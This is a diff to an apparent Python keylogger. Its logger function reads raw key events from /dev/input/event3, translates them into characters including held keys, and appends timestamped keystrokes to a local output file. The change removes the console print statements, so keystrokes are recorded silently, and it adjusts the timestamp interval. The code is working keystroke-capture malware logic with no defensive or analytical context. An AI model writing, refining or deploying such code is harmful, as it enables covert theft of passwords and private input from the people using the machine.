@@ -275,6 +275,7 @@ def logger():
 	log = open('./output.txt', 'a')
 	log.write(toWrite)
 	log.close()
+	toWrite = ''
 	f = open('/dev/input/event3', 'r')
 	while True: 
 		for bit in f.read(1):
@@ -282,14 +283,13 @@ def logger():
 			if len(byte) == 8:
 				if byte[2] in keyboardMap:
 					if byte == [1, 0, byte[2], 0, 1, 0, 0, 0]:
-						print keyboardMap[byte[2]]
 						toWrite = keyboardMap[byte[2]] + " "
 					elif byte == [1, 0, byte[2], 0, 2, 0, 0, 0]:
-						print keyboardMap[byte[2]] + " HOLD"
 						toWrite = keyboardMap[byte[2]] + "_HOLD "
-					if (datetime.now() - currentTime > timedelta(minutes=2)):
+					if (datetime.now() - currentTime > timedelta(seconds=120)):
 						toWrite += '\n' + strftime("%d-%m-%Y %H:%M:%S", localtime()) + '\n'
 						currentTime = datetime.now()
+					#print '/n' + toWrite
 					log = open('./output.txt', 'a')
 					log.write(toWrite)
 					log.close()
